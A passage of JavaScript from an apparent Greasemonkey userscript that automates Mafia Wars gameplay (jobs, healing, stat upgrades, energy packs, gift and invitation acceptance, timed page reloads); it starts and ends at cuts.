  if (running && !maxed && isGMChecked('autoLottoOpt') && hasMarket) {
    if (autoLotto()) return;
  }

  // Auto-war (limit to level 4 and above)
  if (running && !maxed && isGMChecked('autoWar') && hasFight) {
    if (autoWar()) return;
  }

  // Auto-accept
  if (running && !maxed && invites > 0 && isGMChecked('acceptMafiaInvitations')) {
    if (autoAccept()) return;
  }

  // Auto-giftwaiting (limit to level 6 and above)
  if (running && !maxed && isGMChecked('autoGiftWaiting') && hasHome) {
    if (autoGiftWaiting()) return;
  }

  // Auto-dailychecklist
  if (running && !maxed && isGMChecked('autoDailyChecklist') && hasHome) {
    if (autoDailyChecklist()) return;
  }

  // Auto-Enforce title
  if (running && !maxed && GM_getValue('autoEnforcedTitle')!='' && !timeLeftGM('autoEnforcedTitleTimer')) {
    if (autoEnforce()) return;
  }

  // Auto-GiftAccept
  if (running && !maxed && isGMChecked('autoGiftAccept') && hasHome) {
    if (autoGiftQueue()) return;
    if (autoGiftAccept()) return;
  }

  // Auto-Safehouse (aka Crime Spree now)
  if (running && !maxed && isGMChecked('autoSafehouse') && hasHome) {
    if (autoSafehouse()) return;
  }

  // Mini-pack check
  var xpPtsFromEnergy = (energy + 200) * getEnergyGainRate();
  var xpPtsFromStamina = (stamina + 200) * getStaminaGainRate();
  var canUseMiniPack = (xpPtsFromEnergy < ptsToNextLevel) && (xpPtsFromStamina < ptsToNextLevel);
  if (running && !maxed && canUseMiniPack && isGMChecked('checkMiniPack') && !timeLeftGM('miniPackTimer')) {
    if (miniPack()) return;
  }

  // Auto-energypack
  energyPackElt = xpathFirst('.//a[contains(@onclick, "xw_action=use_and_energy_all")]', innerPageElt);
  energyPackElt = energyPackElt ? energyPackElt : xpathFirst('.//a[contains(@onclick, "xw_action=use_energy_pak")]', innerPageElt);
  energyPack = (energyPackElt && onHome()) ? true : false;
  var energyCountdownElt = xpathFirst('.//div[contains(@id, "mbox_energy_timer_container")]', innerPageElt);
  if (energyCountdownElt) {
    if (energyCountdownElt.style.display == 'block') {
      energyPack = false;
    }
  }
  var ptsFromEnergyPack = maxEnergy * 1.25 * getEnergyGainRate();
  var ptsToLevelProjStaminaUse = ptsToNextLevel - stamina*getStaminaGainRate();
  var autoEnergyPackWaiting = running && energyPack &&
                              ptsFromEnergyPack <= ptsToLevelProjStaminaUse &&
                              isGMChecked('autoEnergyPack');

  if ((autoEnergyPackWaiting && (energy <= 2)) || (energyPack && isGMChecked('autoEnergyPackForce') && (energy <= GM_getValue('autoEnergyPackForcePts',0)))) {
    DEBUG('energyPack='+energyPack+'  energy='+energy+ '  ptsToNextLevel=' + ptsToNextLevel +
          '  ptsToLevelProjStaminaUse=' + ptsToLevelProjStaminaUse);
    if (autoEnergyPackWaiting) {
      addToLog('energyPack Icon', 'This energy pack should give you approximately ' + parseInt(ptsFromEnergyPack) + ' xp of your ' + parseInt(ptsToLevelProjStaminaUse) + ' projected remaining xp.' );
    }
    if (!energyPackElt){
      DEBUG('Cant find energy pack to click');
    } else {
      Autoplay.fx = function() {
        clickAction = 'energypack';
        clickElement(energyPackElt);
        DEBUG('Clicked to use energy pack');
      };
      Autoplay.start();
      return;
    }
  }

  // Do jobs or fight/hit. Give priority to spending stamina if it needs
  // to be burned and using one won't level up. Give priority to jobs if
  // within one stamina of leveling, or if an energy pack is waiting, or
  // if energy is fuller than stamina (in percentage terms)
  // Prioritize burning of energy if level-up within reach.
  if ((autoMissionif && SpendEnergy.canBurn) || (autoMissionif &&
       !(autoStaminaSpendif && SpendStamina.canBurn && ptsToNextLevel > 6) &&
       (ptsToNextLevel <= 6 || autoEnergyPackWaiting || energy/maxEnergy >= stamina/maxStamina))) {
    autoMission();
    return;
  }
  if (autoStaminaSpendif) {
    if (autoStaminaSpend()) return;  // staminaspend is unchecked comes back false

    // Attempt failed. Randomize stamina setting (if set)
    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) {
      randomizeStamina();
      if (autoStaminaSpend()) return;

    // Attempt failed. Let some other action happen before trying again
    } else {
      skipStaminaSpend = true;
    }
  }
  if (autoMissionif) {
    autoMission();
    return;
  }

  // Auto-upgrade properties (limit to level 4 and above, skip if flash is enabled)
  // If isFlashed==FLASH_UNDEFINED it will enter the properties once, after that, isFlashed is either FLASHED_ENABLED or FLASHED_DISABLED
  if (running && isGMChecked('autoBuy') && hasProps && (isFlashed!=FLASH_ENABLED)) {
    for (var i = 0, iLength = cities.length; i < iLength; ++i) {
      if (i != LV && level >= cities[i][CITY_LEVEL]) {
        // Upgrade properties
        if (upgradeProps(i)) return;
      }
    }
  }

  // If we reach this point, the script is considered to be idle. Anything the
  // script might do when there is nothing else to do should go below here.
  idle = true;

  // If not previously idle, check the home page.
  if (running && !previouslyIdle) {
    DEBUG('Now idle. Checking the home page.');
    Autoplay.fx = goHome;
    Autoplay.start();
    return;
  }

  // If fight/hit/jobs are being skipped, turn them back on and go to the home page
  if (running && (skipStaminaSpend || skipJobs)) {
    skipStaminaSpend = false;
    skipJobs = false;
    Autoplay.start();
    return;
  }

  // Idle in preferred city
  if (running && idle && isGMChecked('idleInCity') && city != GM_getValue('idleLocation', NY)) {
    DEBUG('Idling. Moving to ' + cities[GM_getValue('idleLocation', NY)][CITY_NAME] + '. ');
    Autoplay.fx = function(){goLocation(GM_getValue('idleLocation',NY));};
    Autoplay.start();
    return;
  }

  // Use the reload animate obj to kick off autoplay again
  autoReload(true);
}
////////////////////////////////////////////// end of do auto play ///////////////////////////////////

function canautoheal() {
// DEBUG('in can auto heal - - 2 ');
  if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB) {
    DEBUG(' STAMINA_HOW_FIGHTROB  blocked autoheal ');
    return false;
  }
  if((GM_getValue('staminaSpendHow') == STAMINA_HOW_ROBBING) && (isGMChecked('BlockHealRobbing')) )  {
    DEBUG(' STAMINA_HOW_ROBBING blocked autoheal ');
    return false;
  }

//  DEBUG('canautoheal is allowing healing ');
  return true;
}

function getAutoPlayDelay() {
  return Math.floor(parseFloat(GM_getValue('d1', '3')) +
         parseFloat((GM_getValue('d2', '5')) -
         parseFloat(GM_getValue('d1', '3')))*Math.random())*1000;
}

function autoReload(forceReload) {
  if (forceReload || isGMChecked('autoClick')) {
    Reload.fx    = function() {
      // Try the "nice" way first, but reload completely if that doesn't work.
      DEBUG('forced Page Reload');
      goHome();
      Reload.fx = loadHome;
      Reload.delay = 10000;
      Reload.start();
    };
    Reload.delay = Math.floor(parseFloat(GM_getValue('r1', '30')) +
                   parseFloat((GM_getValue('r2', '110')) -
                   parseFloat(GM_getValue('r1', '30')))*Math.random())*1000;
    Reload.start();
  }
}

function autoAccept() {
  // Load My Mafia
  if (!onMyMafiaNav()) {
    Autoplay.fx = goMyMafiaNav;
    Autoplay.start();
    return true;
  }

  // Get the "accept all" link.
  var elt = xpathFirst('.//a[contains(., "accept all")]', innerPageElt);
  if (!elt) {
    DEBUG('Can\'t find accept link to click.');
    return true;
  } else {
    // Get the ajax link from the profile element
    var eltProfile = xpathFirst('//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]');
    if (eltProfile) {
      elt.setAttribute('onclick',eltProfile.getAttribute('onclick')
        .replace(/xw_controller=stats/i,'xw_controller=recruit')
        .replace(/xw_action=view/i,'xw_action=accept&user_id=all&skip_req_frame=1')
      );
    }
  }

  // Accept all invitations.
  Autoplay.fx = function() {
    clickAction = 'accept';
    clickElement(elt);
    DEBUG('Clicked to accept.');
  };
  Autoplay.start();
  return true;
}

function autoHeal() {
  // NOTE: In the interest of time, delays are waived.
  Autoplay.delay = noDelay;
  // Make sure we're in the preferred city.
  var healLocation = parseInt(GM_getValue('healLocation', NY));
  if (healLocation != cities.length && city != healLocation) {
    Autoplay.fx = function() { goLocation(healLocation); };
    Autoplay.start();
    return true;
  }
  // Check if hospitalpopup is visible and healbutton is present.
  var healElt = xpathFirst('.//div[@class="hospital_pop" and not(contains(@style,"none"))]/div[@class="pop_box" and not(contains(@style,"none"))]//a[contains(@onclick,"xw_action=heal")]', popupfodderElt);
  // If not, go to hospital manually
  if (!healElt) {
    // Go to the hospital.
    var hospitalElt = xpathFirst('.//div[@id="clock_health" and not(contains(@style,"none"))]//a[@class="heal_link" or @class="heal_link vt-p"]', statsrowElt);
    if (!hospitalElt) hospitalElt = xpathFirst('.//div[@id="clock_health" and not(contains(@style,"none"))]/a', statsrowElt);
    if (hospitalElt) {
      Autoplay.fx = function() {
        clickElement(hospitalElt);
        DEBUG('Clicked to go to hospital.');
      };
      Autoplay.start();
      return true;
    } else {
      addToLog('warning Icon', 'WARNING: Can\'t find hospital link.');
      return false;
    }
  }

  // Found a heal link. Click it.
  Autoplay.fx = function() {
    clickAction = 'heal';
    clickElement(healElt);
    DEBUG('Clicked to heal.');
  };
  Autoplay.start();
  return true;
}

function AskforHelp(hlpCity) {
  // Common function if job has failed
  var doAskFunction = function (askResult) {
    if (!askResult) {
      addToLog('warning Icon', 'Unable to Ask for Help on ' + helpCity +'.'+ tabno+'. Please Check your \'Ask for Help\'-settings on PS MWAP\'s Mafia tab.');
      if(helpCity==2) GM_setValue('selectMoscowTier', 0);
      if(helpCity==3) GM_setValue('selectBangkokTier', 0);
    }
  };

  var helpCity = parseInt(hlpCity);
  var tabno=0;
  var timerName='';

  if(helpCity==2) {
    DEBUG('Clicking to go to Moscow to look for Ask for Help-job');
    tabno = parseInt(GM_getValue('selectMoscowTier'));
    timerName='AskforHelpMoscowTimer';
  }
  if(helpCity==3) {
    DEBUG('Clicking to go to Bangkok to look for Ask for Help-job');
    tabno = parseInt(GM_getValue('selectBangkokTier'));
    timerName='AskforHelpBangkokTimer';
  }

  // Go to the correct city.
  if (city != helpCity) {
    Autoplay.fx = function() { goLocation(helpCity); };
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doAskFunction(goJobTab(tabno)); };
    Autoplay.start();
    return true;
  }

  if (/You must wait 24 hours/i.test(innerPageElt.innerHTML)) {
    setGMTime(timerName, '2 hour');
    addToLog('warning Icon', ' You must wait 24 hours before you can ask for help again on ' + helpCity +'.'+ tabno);
    DEBUG('Link for Asking says Wait for 24 hours ... Resetting Timer for 2h on ' + helpCity +'.'+ tabno);
  } else {
    var askHelpFriends = xpathFirst('.//a[contains(., "Ask for Help")]', innerPageElt);
    DEBUG(askHelpFriends);

    if (askHelpFriends) {
      addToLog('info Icon', ' Clicked to Ask for Help on ' + helpCity +'.'+ tabno);
      clickElement(askHelpFriends);
      DEBUG(' Clicked to Ask for Help on ' + helpCity +'.'+ tabno);
      setGMTime(timerName, '12 hours');
    return true;
    } else {
      setGMTime(timerName, '1 hour');
      addToLog('info Icon', ' You cannot Ask for Help yet on ' + helpCity +'.'+ tabno);
      DEBUG('Link for Asking for Help not found ... Resetting Timer for 1h on ' + helpCity +'.'+ tabno);
  }
  }
  return;
}

// Pass the item array, item id, and building type
function buildItem(itemArray, itemIndex, buildType){
  if (city != NY) {
    Autoplay.fx = function() { goLocation(NY); };
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Build the clickable element
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+
                        '"remote/html_server.php?xw_controller=propertyV2&' +
                        'xw_action=craft&xw_city=1&recipe='+itemArray[itemIndex][1]+'&building_type='+buildType+'", 1, 1, 0, 0); return false;'});

  if (elt) {
    Autoplay.fx = function() {
      clickAction = 'build item';
      clickContext = {'itemName': itemArray[itemIndex][0], 'buildType': buildType};
      clickElement(elt);
      DEBUG('Clicked to build ' + clickContext.itemName + '.');
    };

    Autoplay.start();
    return true;
  }
  return false;
}

function checkVaultStatus(byUser) {
  if (byUser == false && timeLeftGM('checkVaultTimer')) return;
  DEBUG('Checking vault status..')
  // Handle JSON response
  createAjaxPage(false, 'check vault');
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxResult + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'createData' + SCRIPT.city + '5&city=5", 1, 1, 0, 0); return false;'});
  clickElement(elt);
  return;
}

function autoCollectTake(takeCity) {
  // Go to the correct city.
  if (city != takeCity) {
    Autoplay.fx = function(){goLocation(takeCity);};
    Autoplay.start();
    return true;
  }

  // Visit the property Nav
  if (!onPropertyNav()) {
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }

  createAjaxPage(true);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxPage + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'collectall' + SCRIPT.city + (takeCity+1) + '&requesttype=json", 1, 1, 0, 0); return false;'});
  Autoplay.fx = function() {
    clickAction = 'collect take';
    clickContext = takeCity;
    clickElement(elt);
  };
  Autoplay.delay = getAutoPlayDelay();
  Autoplay.start();
  return true;
}

function autoPlayerUpdates() {
  // Get the updates.
  var pUpdates = xpath('.//div[@class="update_item"]', innerPageElt);
  var pUpdatesLen = pUpdates.snapshotLength;
  var logPlayerUpdatesCount = GM_getValue('logPlayerUpdatesCount');
  if (isUndefined(logPlayerUpdatesCount)) {
    // The settings must have been cleared. Assume all updates were read.
    logPlayerUpdatesCount = pUpdatesLen;
    GM_setValue('logPlayerUpdatesCount', logPlayerUpdatesCount);
  }

  if ((pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) ||
      (pUpdatesLen == 0 && logPlayerUpdatesCount > 0)) {
    if (pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) // Last time checked there were more updates than now, perhaps mw deleted old updates?
      DEBUG('Discrepancy in player updates; new count: ' + pUpdatesLen + ', old count: ' + logPlayerUpdatesCount);
    else  // Player updates have been cleared.
      DEBUG('Player updates were cleared.');
    logPlayerUpdatesCount = 0;
    GM_setValue('logPlayerUpdatesCount', 0);
  }

  // Process new updates.
  if (logPlayerUpdatesCount < pUpdatesLen) {
    DEBUG('Parsing new player updates.');
    for (var i = pUpdatesLen - logPlayerUpdatesCount - 1; i >= 0; i--) {
      if (!parsePlayerUpdates(pUpdates.snapshotItem(i))) return true;
      GM_setValue('logPlayerUpdatesCount', ++logPlayerUpdatesCount);
    }
  }

  // Clear the updates.
  if (pUpdatesLen > GM_getValue('logPlayerUpdatesMax', 25) &&
      logPlayerUpdatesCount == pUpdatesLen) {
    Autoplay.fx = goDeleteNews;
    Autoplay.start();
    return true;
  }

  return false;
}

// MiniPack!
function miniPack() {
  if (timeLeftGM('miniPackTimer')) return;
  miniPackForce();
}
function miniPackForce() {
 if (getHoursTime('miniPackTimer') == 0)
  setGMTime('miniPackTimer', '8 hours');
  DEBUG('Redirecting to force mini Energy');
  window.location.replace('http://toolbar.zynga.com/click.php?to=mwgamestatsplaynow');
}

function autoStat() {
  // Load profile
  if (!onProfileNav() || isUndefined(curAttack)) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  if (onProfileNav()) {
    // Array containers for status settings
    var curStats = [curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var modeStats = [level,curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var statFallbacks = new Array(curStats.length);

    var maxPtDiff = 0;
    var statIndex = 0;
    var statPrio = autoStatPrios.length;
    for (var i = 0, iLength = curStats.length; i < iLength; ++i) {
      // Calculate the Points needed to reach target stat
      var ratio = new Number(GM_getValue(autoStatRatios[i]));
      var base = new Number(GM_getValue(autoStatBases[i]));
      var curStatPrio = new Number(GM_getValue(autoStatPrios[i]));
      var curStatDiff = Math.max (0, ratio * modeStats[GM_getValue(autoStatModes[i])] + base - curStats[i]);

      // Account for priority
      if ((curStatDiff > 0 && curStatPrio < statPrio) || (curStatDiff > maxPtDiff && curStatPrio <= statPrio)) {
        maxPtDiff = curStatDiff;
        statIndex = i;
        statPrio = curStatPrio;
      }

      // Fallback method
      statFallbacks[i] = isGMChecked(autoStatFallbacks[i]) ? i : '';
    }

    // Disable auto-stat when status goals are reached and autoStatDisable is checked
    if (maxPtDiff <= 0 && isGMChecked('autoStatDisable')) {
      addToLog('info Icon', 'All status goals met, please update your goals.');
      GM_setValue('autoStat', 0);
      return false;
    }

    // Increment the status corresponding to the nextStat variable (fallback)
    if (maxPtDiff <= 0) {
      if (statFallbacks.join('') != '') {
        DEBUG('Status GOALS reached, using fallback method.');
        var nextStat = parseInt(GM_getValue('nextStat', ATTACK_STAT));

        // Search for next Stat to increment
        while (statFallbacks.indexOf(nextStat) == -1)
          nextStat = (nextStat + 1) % curStats.length;

        DEBUG('Next stat in fallback mode: ' + autoStatDescrips[nextStat + 1]);
        statIndex = nextStat;
      } else {
        // Do not call autoStat until next level Up
        DEBUG('Status GOALS reached, waiting till next level up.');
        GM_setValue('restAutoStat', 1);
        return false;
      }
    } else {
      DEBUG('Next stat to increment : ' + autoStatDescrips[statIndex + 1] + ' (' + maxPtDiff + ' points to goal) ');
      GM_setValue('restAutoStat', 0);
    }

    // Add stats to the attribute farthest from the goal
    // (or the nextStat if fallback kicked in)
    var upgradeKey;
    switch (statIndex) {
      case ATTACK_STAT    : upgradeKey = 'attack';        break;
      case DEFENSE_STAT   : upgradeKey = 'defense';       break;
      case HEALTH_STAT    : upgradeKey = 'max_health';    break;
      case ENERGY_STAT    : upgradeKey = 'max_energy';    break;
      case STAMINA_STAT   : upgradeKey = 'max_stamina';   break;

      default             :
        // Disable auto-stats when maxPts calculated is NaN
        GM_setValue('autoStat', 0);
        addToLog('warning Icon', 'BUG DETECTED: Invalid calculated maxPts value "' + maxPts + '". Auto-stat disabled.');
        return false;
    }

    var upgradeAmt = (stats > 4 && (maxPtDiff > 4 || maxPtDiff <= 0))? 5 : 1;
    var upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'") and contains(@onclick,"upgrade_amt='+upgradeAmt+'")]', innerPageElt);

    // Try to fallback to 1 skill point button
    if (!upgradeElt){
      upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'")]', innerPageElt);
    }

    if (!upgradeElt){
      DEBUG('Couldnt find link to upgrade stat.');
      return false;
    }

    // Use click simulation
    Autoplay.fx = function() {
      clickAction = 'stats';
      clickElement(upgradeElt);
      DEBUG('Clicked to upgrade: ' + autoStatDescrips[statIndex + 1]);
    };
    Autoplay.start();
    return true;
  } else {
    // Disable auto-stats when profile page cannot be loaded
    GM_setValue('autoStat', 0);
    addToLog('warning Icon', 'BUG DETECTED: Unable to load Profile page, autostat disabled.');
    return false;
  }
}

function autoEnforce() {
  // Load profile
  if (!onProfileNav()) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  var titleChange=0;
  var oldindex=0;
  var newindex=0;
  var logtxt="";

  if (onProfileNav()) {
    var selectElt = xpathFirst('.//select[@name="title"]', innerPageElt);
    if(!selectElt){
      DEBUG('selectElt NOT found');
    } else {
      oldindex = selectElt.selectedIndex;
      DEBUG('Current Selection :'+oldindex+' - '+ selectElt[oldindex].text+' trying to change to' + GM_getValue('autoEnforcedTitle'));
      if(selectElt[oldindex].text != GM_getValue('autoEnforcedTitle') ){
        for(newindex = 0; newindex < selectElt.length; ++newindex) {
          DEBUG(selectElt[newindex].text);
          if(selectElt[newindex].text == GM_getValue('autoEnforcedTitle')) {
            selectElt.selectedIndex = newindex;
            DEBUG('Title set to :'+selectElt[newindex].text);
            titleChange=1;
          }
        }
      } else {
        logtxt +='MW title already set to '+ GM_getValue('autoEnforcedTitle')+'. ';
        titleChange=2;
      }

      if(titleChange==1){
        var clickElt = xpathFirst('.//input[@type="submit" and contains(@value,"Change Title")]', innerPageElt);
        if(clickElt) {
          DEBUG('clickElt found');
          clickElement(clickElt);
          DEBUG('Clicked to Change Title to '+ GM_getValue('autoEnforcedTitle'));
          logtxt +='MW title changed to '+ GM_getValue('autoEnforcedTitle')+'. ';
        } else {
          DEBUG('clickElt not found');
          logtxt +='MW title not changed - Click Button not Found. ';
        }
      } else if(titleChange==0) {
        logtxt +='Invalid MW Title or No change Needed : Title not changed. ';
      }
    }

  } else {
    addToLog('warning Icon','BUG DETECTED: Unable to load Profile page.');
  }

  var autoEnforceTime = parseFloat(GM_getValue('autoEnforcedTitleTime', '1'));
  if(autoEnforceTime == 1)
    setGMTime('autoEnforcedTitleTimer', '1 hour');
  else
    setGMTime('autoEnforcedTitleTimer', autoEnforceTime + ' hours');
  logtxt += 'Trying again in '+autoEnforceTime+' hour(s).'
  addToLog('info Icon', logtxt);
  return;

}

// Get reward to cost ratio:
function calcJobratio(job) {
  var ratio = Math.round(missions[job][MISSION_XP] / missions[job][MISSION_ENERGY] * 100) / 100;
  return isNaN(ratio) ? 0 : ratio;
}

// Retreive if and how much energy can be salvaged for the next level (eg after spending an energy pack)
function canSalvageEnergy(job) {
  if (energy <= maxEnergy) return false;
  var amount = energy - (Math.ceil((ptsToNextLevel) / missions[job][MISSION_XP]) * missions[job][MISSION_ENERGY]) - maxEnergy;
  if (amount > 0) return amount;
  else return false;
}

function canMission() {
  if (!isGMChecked('autoMission')) return false;

  var i, job;
  if (isGMChecked('multipleJobs') &&
      getSavedList('jobsToDo').length == 0) {

    var availableJobs = eval('(' + GM_getValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{}})') + ')');
    var masteredJobs = eval('(' + GM_getValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{}})') + ')');
    var expLeft = ptsToNextLevel;
    var ratio = Math.ceil(expLeft / energy * 100) / 100;
    var multiple_jobs_list = getSavedList('selectMissionMultiple');
    var multiple_jobs_ratio_sorted = [];
    var jobs_selection = [];
    var singleJobLevelUp = [];
    var enoughEnergy = false;
    var canSalvage = false;

    // mission mastery code
    var mastery_jobs_list = getSavedList('masteryJobsList');
    for (i = 0, iLength=mastery_jobs_list.length; i < iLength; ++i) {
      // Filters jobs on the ignorelist
      job = mastery_jobs_list[i];

      // Only push jobs that does not exist on the main list
      if (multiple_jobs_list.indexOf(job) == -1)
        multiple_jobs_list.push(job);
    }

    for (i = 0, iLength= multiple_jobs_list.length; i < iLength; ++i) {
      job = multiple_jobs_list[i];
      var mission = missions[job];
      if(!mission) continue;
      // This should enable us to use mastery jobs for single job level ups
      var singleJobLevelUpPossible = false;

      // Ignore jobs that are not yet available
      if (availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
         availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) == -1) {
        continue;
      }

      // Determine the job's experience-to-energy ratio.
      if (isNaN(mission[MISSION_RATIO])) mission[MISSION_RATIO] = calcJobratio(job);
      if (mission[MISSION_ENERGY] <= energy) {
        enoughEnergy = true;
        if (mission[MISSION_XP] >= expLeft) {
          var levelJob = [job, mission[MISSION_ENERGY], mission[MISSION_XP]];
          singleJobLevelUp.push(levelJob);
          singleJobLevelUpPossible = true;
        }
      }

      // Ignore mastered jobs unless it can do a single job level up
      if (masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
          masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) != -1 &&
          singleJobLevelUpPossible == false) {
        continue;
      }

      // Can salvage energy with this job
      if (!canSalvage && canSalvageEnergy(job)) canSalvage = true;
      multiple_jobs_ratio_sorted.push(job);
    }

    if (!enoughEnergy) return false;

    var doJob;
    multiple_jobs_ratio_sorted.sort(function(a, b) { return missions[b][MISSION_RATIO] - missions[a][MISSION_RATIO]; });

    // Don't do expBurners or biggest exp job if energy can be salvaged
    if (singleJobLevelUp.length > 0 && !canSalvage) {
      singleJobLevelUp.sort(function(a, b) { return b[2] - a[2]; });
      // One job is enough to level up. Pick the one that pays the most.
      doJob = singleJobLevelUp[0][0];

      if (isGMChecked('endLevelOptimize')) {
        // Get the exp burner from the missions array
        var expBurnFilter = function(v, i, a) { return (i > 6 && i < singleJobLevelUp[0][0] &&
                                                        a[i][6] < 2 &&
                                                        a[i][1] < singleJobLevelUp[0][1] * 0.5) ? 1:0; };
        var expBurners = missions.filter(expBurnFilter);
        expBurners.sort(function(a, b) { return b[5] - a[5]; });

        // Burn up exp before leveling up to maximize energy
        for (var i = 0, iLength=expBurners.length; i < iLength; ++i) {
          var expBurner = expBurners[i];
          if ( (energy - singleJobLevelUp[0][1]) > expBurner[1] &&
             expLeft >= Math.floor(expBurner[5]) * 1.5) {
            doJob = missions.searchArray(expBurner[0], 0)[0];
            jobOptimizeOn = true;
            break;
          }
        }
      }
    } else {
      // Can't level up. Pick a job we can do whose ratio is high enough.
      for (i = 0; i < multiple_jobs_ratio_sorted.length; i++) {
        if (energy >= missions[multiple_jobs_ratio_sorted[i]][MISSION_ENERGY] &&
            ratio <= missions[multiple_jobs_ratio_sorted[i]][MISSION_RATIO]) {
          jobs_selection.push(multiple_jobs_ratio_sorted[i]);
        }
      }
      if (jobs_selection.length == 0) {
        // No jobs meet the ratio necessary to level up. Go with the highest.
        doJob = multiple_jobs_ratio_sorted[0];
      } else {
        // Pick the one with the lowest ratio.
        if (!canSalvage) {
          doJob = jobs_selection[jobs_selection.length-1];
        // Energy can be salvaged, pick the one with the highest ratio
        } else {
          doJob = jobs_selection[0];
        }
      }
    }
    if (GM_getValue('selectMission') != doJob) {
      if (isUndefined(doJob)) {
        addToLog('info Icon', 'No jobs selected. Disabling automission.');
        GM_setValue('autoMission', 0);
        return false;
      } else {
        addToLog('info Icon', 'Switching job to ' + missions[doJob][MISSION_NAME] + '.');
        GM_setValue('selectMission', doJob);
      }
    }
  }

  if (energy < missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]) {
    DEBUG('Skipping jobs: energy=' + energy + ', cost=' + missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]);
    return false;
  }

  // If spending energy will set energy below Energy floor, skip jobs
  var nextJobEnergy =  missions[GM_getValue('selectMission', 1)][MISSION_ENERGY];
  if (energy - nextJobEnergy < SpendEnergy.floor && !SpendEnergy.canBurn) {
    DEBUG('Not spending energy: energy=' + energy +
          ', floor=' + SpendEnergy.floor +
          ', nextJobEnergy=' + nextJobEnergy +
          ', burn=' + SpendEnergy.canBurn);
    return false;
  }

  if (energy < SpendEnergy.ceiling && !SpendEnergy.canBurn &&
      !GM_getValue('useEnergyStarted')) {
    DEBUG('Rebuilding energy: energy=' + energy +
          ', ceiling=' + SpendEnergy.ceiling + ', burn=' + SpendEnergy.canBurn);
    return false;
  }

  return true;
}

function autoMission() {
  var jobid       = GM_getValue('selectMission', 1);
  var jobName     = missions[jobid][MISSION_NAME];
  var jobno       = missions[jobid][MISSION_NUMBER];
  var tabno       = missions[jobid][MISSION_TAB];
  var cityno      = missions[jobid][MISSION_CITY];
  var tabnopath   = missions[jobid][MISSION_TABPATH];
  var nodelv      = missions[jobid][MISSION_NODE_LV];

//newlv
  if (!tabnopath) var tabnopath = 0 ;
  if (!nodelv)    var nodelv    = ''  ;
  DEBUG('autoMission = ' + jobid + ' ' + jobName + ' ' + jobno + ' ' + tabno + ' ' + cityno + ' tabnopath ' + tabnopath );

  if (SpendEnergy.floor &&
      isGMChecked('allowEnergyToLevelUp') &&
      GM_getValue('autoEnergyBurn') !== SpendEnergy.canBurn) {
    GM_setValue('autoEnergyBurn', SpendEnergy.canBurn);
    if (SpendEnergy.canBurn) {
      addToLog('process Icon', energyIcon + '<span style="color:#009966; font-weight: bold;">Burning through energy reserve to level up.</span>');
    } else {
      DEBUG('Not within reach of a level up. Energy burning is off.');
    }
  }

  // Common function if job has failed
  var doJobFunction = function (jobResult) {
    if (!jobResult) {
      addToLog('warning Icon', 'Unable to perform job ' + jobName + '.');
      var jobs = getSavedList('jobsToDo', '');
      if (jobs.length == 0) {
        // Skip jobs temporarily, and check the home page
        DEBUG('No more jobs to perform.');
        skipJobs = true;
        goHome();
      } else {
        // Else Get the next job to perform
        DEBUG('Looking for the next job to perform.');
        popJob();
        autoMission();
      }
    }
  };

  // Go to the correct city.
  if (city != cityno) {
    Autoplay.fx = function() { doJobFunction(goLocation(cityno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doJobFunction(goJobTab(tabno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tabnopath in LV
  if(city == LV){
    if (!onJobTabpath(tabnopath)) {
      goJobTabPath(tabnopath);
    }
  }

  // Buy requirements first, if any
  if (getJobRowItems(jobName)) {
    if (jobid != GM_getValue('selectMission', 1))
      Autoplay.fx = autoMission;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return;
  }

  // Do the job
  Autoplay.fx = function() { doJobFunction(goJob(jobno)); };
  Autoplay.delay = (isGMChecked('burstJob') && GM_getValue('burstJobCount', 0) == 0) ? noDelay : getAutoPlayDelay();
  Autoplay.start();
} // end of automission



function currentJobTab() {
  var elt = xpathFirst('.//li[contains(@class, "tab_on")]//a', innerPageElt);
  if (!elt || !elt.getAttribute('onclick').match(/tab=(\d+)/)) {
    return -1;
  }
  // FIXME: Not working for chrome at the moment
  //return parseInt(RegExp.$1);
  return parseInt(elt.getAttribute('onclick').split('tab=')[1].split("'")[0]);
}

    /// current Job Tab path
function currentJobTabPath() {
  var tst = null ;
  var elt = xpathFirst('.//div[contains(@class, "path_on")]//a', innerPageElt);
//  if (!elt)     DEBUG(' JOB TAB - path - !elt path not found - ');
//       tst = (elt.getAttribute('onclick').match(/  0  /) ); // returns 0
//new_ -- gets matched literally as a string, as is.
//\d -- means match any and only digits
//+ -- means to match thoose digits one or more times
//$ -- this means the end of the string, so with the pattern pieces before it, it must not have anything but "new_" and some numbers, then the end of the string (string being the ID attribute)

  tst = parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
